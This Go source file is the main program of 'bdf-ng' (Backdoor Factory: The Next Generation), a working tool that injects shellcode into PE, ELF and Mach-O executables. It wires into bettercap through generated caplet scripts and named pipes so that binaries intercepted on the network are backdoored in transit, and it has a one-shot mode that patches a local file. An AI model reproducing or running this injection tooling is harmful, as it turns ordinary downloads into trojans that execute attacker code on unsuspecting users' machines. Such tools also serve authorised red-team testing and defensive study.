package main

import (
	"archive/tar"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"github.com/Binject/shellcode/api"

	"github.com/akamensky/argparse"
	"github.com/mholt/archiver"

	"github.com/Binject/binjection/bj"
	"github.com/Binject/shellcode"
	"github.com/h2non/filetype"
)

func main() {
	dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	parser := argparse.NewParser("bdf-ng", "Backdoor Factory: The Next Generation")
	scDir := parser.String("s", "shelldir", &argparse.Options{Required: true,
		Default: filepath.Join(dir, "shellcode"), Help: "Shellcode Directory"})
	cwd := parser.String("d", "cwd", &argparse.Options{Required: false,
		Default: dir, Help: "Working Directory"})
	initMode := parser.Flag("p", "init", &argparse.Options{Required: false,
		Help: "Create the empty shellcode directories and quit"})
	testfile := parser.String("i", "shellfile", &argparse.Options{Required: false,
		Help: "File to inject (oneshot test mode)"})
	outfile := parser.String("o", "out", &argparse.Options{Required: false,
		Help: "Output file (oneshot test mode)"})
	if err := parser.Parse(os.Args); err != nil {
		log.Println(parser.Usage(err))
		return
	}
	if *outfile == "" {
		*outfile = *testfile + ".b"
	}

	repo := shellcode.NewRepo(*scDir)
	if *initMode {
		log.Println("Shellcode Directories Initialized, copy shellcode files with .bin extensions into each directory.")
		return
	}
	config := &bj.BinjectConfig{Repo: repo, CodeCaveMode: false}

	if *testfile != "" { // One-shot test mode
		f, err := os.Open(*testfile)
		if err != nil {
			log.Fatal(err)
		}
		dry, err := ioutil.ReadAll(f)
		if err != nil {
			log.Fatal(err)
		}
		wet, err := Inject(dry, config)
		if err != nil {
			log.Fatal(err)
		}
		err = ioutil.WriteFile(*outfile, wet, 0755)
		if err != nil {
			log.Fatal(err)
		}
		return
	}

	pipeName := ""
	if runtime.GOOS == "windows" {
		pipeName = `\\.\pipe\` + "bdf"
	} else {
		pipeName = filepath.Join(*cwd, "bdf")
	}
	dryPipe := pipeName + "dry"
	wetPipe := pipeName + "wet"
	capletPath := filepath.Join(*cwd, "binject.cap")

	if err := GenerateCaplet(capletPath); err != nil {
		log.Fatal(err)
	}
	if err := GenerateCapletScript(filepath.Join(*cwd, "binject.js"), CapletScriptConfig{DryPipe: dryPipe, WetPipe: wetPipe}); err != nil {
		log.Fatal(err)
	}

	log.Printf("RUN THIS COMMAND in another terminal:\n\tbettercap -caplet %s\n", capletPath)

	go ListenPipeDry(dryPipe, config)
	ListenPipeWet(wetPipe)
}

// Inject a binary or archive
func Inject(dry []byte, config *bj.BinjectConfig) (wet []byte, err error) {

	kind, _ := filetype.Match(dry)
	if kind == filetype.Unknown || kind.MIME.Type != "application" {
		return dry, nil // unknown type or non-application type (archives are application type also), pass it on
	}
	fmt.Printf("File type: %s. MIME: %s %s %s\n", kind.Extension, kind.MIME.Type, kind.MIME.Subtype, kind.MIME.Value)

	switch kind.MIME.Subtype {
	case "gzip":
		bb := bytes.NewBuffer(nil)
		z := archiver.DefaultTarGz
		/*
			z := archiver.TarGz{
				CompressionLevel: flate.DefaultCompression,
			}
		*/
		z.CompressionLevel = 9

		err = z.Create(bb)
		if err != nil {
			return nil, err
		}
		defer z.Close()

		if err := Walk(z, dry, func(f archiver.File) error {

			log.Printf("%T %+v\n", f.Header, f.Header)

			zfh, ok := f.Header.(*tar.Header)
			if ok {
				fmt.Printf("zfh: %+v\n", zfh)

				// get file's name for the inside of the archive
				info := zfh.FileInfo()
				/*
					internalName, err := archiver.NameInArchive(info, zfh.Name, zfh.Name)
					if err != nil {
						fmt.Println(err)
						return err
					}
					fmt.Printf("internalName: %+v\n", internalName)
				*/
				// write it to the archive
				err = z.Write(archiver.File{
					FileInfo: archiver.FileInfo{
						FileInfo:   info,
						CustomName: zfh.Name,
					},
					ReadCloser: f.ReadCloser,
				})
				if err != nil {
					fmt.Println("inside walk:", err)
					//return err
					log.Fatal()
				}
			}
			return nil
		}); err != nil {
			fmt.Println("outer walk:", err)
		} else {
			return bb.Bytes(), nil
		}

	case "x-msdownload":
		fallthrough
	case "x-executable":

		bintype, err := bj.BinaryMagic(dry)
		if err != nil {
			return nil, err
		}
		os := api.Windows
		switch bintype {
		case bj.MACHO:
			os = api.Darwin
		case bj.ELF:
			os = api.Linux
		case bj.PE:
			os = api.Windows
		}
		// todo: detect 32 vs 64 bit, for now just default to 64

		scdata, err := config.Repo.Lookup(os, api.Intel64, "*.bin")
		if err != nil {
			return nil, err
		}

		return bj.Binject(dry, scdata, config)
	}

	return dry, nil // default to doing nothing
}

// Walk calls walkFn for each visited item in archive.
func Walk(t archiver.Reader, archive []byte, walkFn archiver.WalkFunc) error {

	file := bytes.NewBuffer(archive)
	if err := t.Open(file, 0); err != nil {
		return fmt.Errorf("opening archive: %v", err)
	}
	defer t.Close()

	for {
		f, err := t.Read()
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("opening next file: %v", err)
		}
		err = walkFn(f)
		if err != nil {
			fmt.Printf("walking %s: %v\n", f.Name(), err)
			return nil
		}
	}

	return nil
}
